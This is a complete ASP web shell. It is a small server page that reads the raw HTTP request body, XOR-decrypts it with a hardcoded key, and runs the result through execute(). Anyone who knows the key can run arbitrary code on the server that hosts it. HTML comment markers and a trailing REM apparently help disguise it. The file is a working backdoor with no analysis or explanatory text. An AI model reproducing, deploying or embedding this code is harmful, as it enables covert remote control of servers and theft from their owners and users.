<% 
<!-- 
Response.CharSet = "UTF-8" 
BJz1l1="0192023a7bbd7325"  
Session("k")=BJz1l1 
CBYk=Request.TotalBytes 
QNGSU=Request.BinaryRead(CBYk) 
For i=1 To CBYk 
Lm4y7t=ascb(midb(QNGSU,i,1)) Xor Asc(Mid(BJz1l1,(i and 15)+1,1))  
VSRBJ=VSRBJ&Chr(Lm4y7t) 
Next 
execute(VSRBJ)REM ) 
-->
%>